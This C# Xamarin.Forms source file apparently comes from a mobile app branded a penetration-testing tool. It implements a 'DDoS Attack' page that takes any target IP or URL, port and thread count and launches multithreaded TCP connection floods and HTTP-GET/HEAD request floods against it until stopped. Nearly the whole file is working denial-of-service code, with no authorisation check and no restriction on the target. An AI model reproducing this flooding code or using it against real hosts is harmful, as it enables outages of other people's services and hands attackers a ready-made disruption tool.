using PenTestTool.Services;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

using Xamarin.Forms;
using Xamarin.Forms.Xaml;

namespace PenTestTool.Pages
{
    [XamlCompilation(XamlCompilationOptions.Compile)]
    public partial class DDoSAttack : ContentPage
    {
        public static bool DDOS_RUNNING = false;
        public DDoSAttack()
        {
            InitializeComponent();

            Title = "DDoS Attack";

            start.Clicked += Start_Clicked;
        }

        private void Start_Clicked(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(target.Text))
            {
                DisplayAlert("Oops!", "Target cannot be empty.", "Ok");
                return;
            }

            if (string.IsNullOrEmpty(port.Text))
            {
                DisplayAlert("Oops!", "Port number cannot be empty.", "Ok");
                return;
            }

            if (string.IsNullOrEmpty(thread.Text))
            {
                DisplayAlert("Oops!", "Thread number cannot be empty.", "Ok");
                return;
            }

            if (Convert.ToInt16(thread.Text) < 1)
            {
                thread.Text = "1";
            }

            if (thread.Text == "0" || Convert.ToInt16(thread.Text) > 20)
            {
                DisplayAlert("Warning", "Thread more than 20 might exhausting your device. Use it at your own risk.", "Ok");
                //return;
            }

            if (!DDOS_RUNNING)
            {
                //start ddos attack
                Task.Run(() =>
                {
                    string proto = protocol.SelectedItem as string;
                    IPAddress IPAddress = null;
                    int Thread = Convert.ToInt32(thread.Text);
                    int Port = Convert.ToInt16(port.Text);

                    if (target.Text.Contains("http"))
                    {
                        Uri uri1 = new Uri(target.Text);
                        IPAddress = Dns.GetHostAddresses(uri1.Host)[0];
                    }
                    else
                    {
                        IPAddress = IPAddress.Parse(target.Text);
                    }

                    Log("Target IP: " + IPAddress.ToString());
                    Log("Target Port: " + Port.ToString());
                    Log("Thread: " + Thread.ToString());

                    DDOS_RUNNING = true;

                    switch (proto)
                    {
                        case "TCP":
                        case "UDP":
                            Log("Attack Protocol: TCP/UDP");

                            for (int i = 0; i < Thread; i++)
                            {
                                Log("Starting DDoS Thread " + i.ToString());
                                Task.Run(() => TCPUDPDoS(IPAddress, Port, false, data.Text, false, 0));
                            }
                            break;

                        case "HTTP-GET":
                            if (!target.Text.Contains("http"))
                            {
                                DisplayAlert("Oops!", "Unsupported target for HTTP attack. Please insert a valid URL starts with http:// or https://", "Ok");
                                return;
                            }

                            Log("Attack Protocol: HTTP-GET");

                            Uri uri2 = new Uri(target.Text);

                            for (int i = 0; i < Thread; i++)
                            {
                                Log("Starting DDoS Thread " + i.ToString());
                                Task.Run(() => HTTPDoS(IPAddress, Port, true, 0, "GET", uri2.PathAndQuery, uri2.Host, true, false, 30));
                            }
                            break;

                        case "HTTP-HEAD":
                            if (!target.Text.Contains("http"))
                            {
                                DisplayAlert("Oops!", "Unsupported target for HTTP attack. Please insert a valid URL starts with http:// or https://", "Ok");
                                return;
                            }

                            Log("Attack Protocol: HTTP-HEAD");

                            Uri uri3 = new Uri(target.Text);

                            for (int i = 0; i < Thread; i++)
                            {
                                Log("Starting DDoS Thread " + i.ToString());
                                Task.Run(() => HTTPDoS(IPAddress, Port, true, 0, "HEAD", uri3.PathAndQuery, uri3.Host, true, false, 30));
                            }
                            break;

                        default:
                            DisplayAlert("Oops!", "Unsupported protocol. Please select TCP, UDP or HTTP.", "Ok");
                            return;
                            break;
                    }

                    Task.Run(() => PollingUpdate());

                    Log("DDoS Attack in Progress");
                });

                
                
                start.BackgroundColor = Color.Red;
                start.Text = "Stop Attack";
            }
            else
            {
                //stop DDOS

                Log("DDoS Attack stopped");

                DDOS_RUNNING = false;
                start.BackgroundColor = Color.DarkGreen;
                start.Text = "Start Attack";
                status_attack.IsVisible = false;
                status_stop.IsVisible = true;
            }
        }

        int ttime = 0;

        async void PollingUpdate()
        {
            ttime = 0;
            Failed = 0;
            Requested = 0;
            Downloaded = 0;
            Packet_Size = 0;
            Packet_Response = 0;

            Device.BeginInvokeOnMainThread(() =>
            {
                status_attack.IsVisible = true;
                status_stop.IsVisible = false;
                status_target.Text = target.Text;
            });
            string proto = protocol.SelectedItem as string;

            int ns = 0;

            while (DDOS_RUNNING)
            {
                await Task.Delay(1000, new System.Threading.CancellationToken()).ContinueWith(task =>
                {
                    ttime++;

                    Device.BeginInvokeOnMainThread(() =>
                    {
                        status_size.Text = Packet_Size.ToString();
                        status_rcv.Text = Downloaded.ToString();
                        status_req.Text = Requested.ToString();
                        status_timer.Text = ttime.ToString() + "s";
                    });
                });
            }
        }

        async void Log(string text)
        {
            Device.BeginInvokeOnMainThread(() =>
            {
                //logs.Children.Add(new Label { Text = text });

            });
           
        }

        int Failed = 0;
        int Requested = 0;
        int Downloaded = 0;
        int Packet_Size = 0;
        int Packet_Response = 0;


        public void TCPUDPDoS(IPAddress IP, int Port, bool Resp, string Data, bool AllowRandom, int Delay)
        {
            try
            {
                IPEndPoint RHost = new IPEndPoint(IP, Port);

                while (DDOS_RUNNING)
                {
                    using (Socket socket = new Socket(RHost.AddressFamily, SocketType.Stream, ProtocolType.Tcp))
                    {
                        socket.NoDelay = true;

                        try
                        {
                            socket.Connect(RHost);
                        }
                        catch
                        {
                            continue;
                        }

                        socket.Blocking = Resp;

                        try
                        {
                            while (DDOS_RUNNING)
                            {
                                Requested++;
                                byte[] buf = System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, (AllowRandom ? F.RandomString() : "")));
                                socket.Send(buf);
                                Packet_Size += buf.Length;

                                if (Delay >= 0) System.Threading.Thread.Sleep(Delay + 1);
                            }
                        }
                        catch
                        {
                            Failed++;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                //Console.WriteLine("========================");
                //Console.WriteLine(ex.Message);
                //Console.WriteLine("========================");
            }
        }

        public void HTTPDoS(IPAddress IP, int Port, bool Resp, int Delay, string Method, string Subsite, string Host, bool Random, bool AllowGzip, int Timeout)
        {
            try
            {
                IPEndPoint RHost = new IPEndPoint(IP, Port);

                while (DDOS_RUNNING)
                {
                    byte[] recvBuf = new byte[128];
                    using (Socket socket = new Socket(RHost.AddressFamily, SocketType.Stream, ProtocolType.Tcp))
                    {
                        socket.NoDelay = true;

                        try
                        {
                            socket.Connect(RHost);
                        }
                        catch
                        {
                            goto _continue;
                        }

                        byte[] buf = F.RandomHttpHeader(Method, Subsite, Host, Random, AllowGzip);

                        socket.Blocking = Resp;

                        try
                        {
                            socket.Send(buf, SocketFlags.None);
                            Packet_Size += buf.Length;
                            Requested++;

                            if (Resp)
                            {
                                socket.ReceiveTimeout = Timeout;
                                Packet_Response += socket.Receive(recvBuf, recvBuf.Length, SocketFlags.None);
                            }
                        }
                        catch
                        {
                            goto _continue;
                        }
                    }

                    Downloaded++;

                _continue:
                    if (Delay >= 0)
                        System.Threading.Thread.Sleep(Delay + 1);
                }
            }
            catch (Exception ex)
            {
                //Console.WriteLine("========================");
                //Console.WriteLine(ex.Message);
                //Console.WriteLine("========================");
            }
        }
    }
}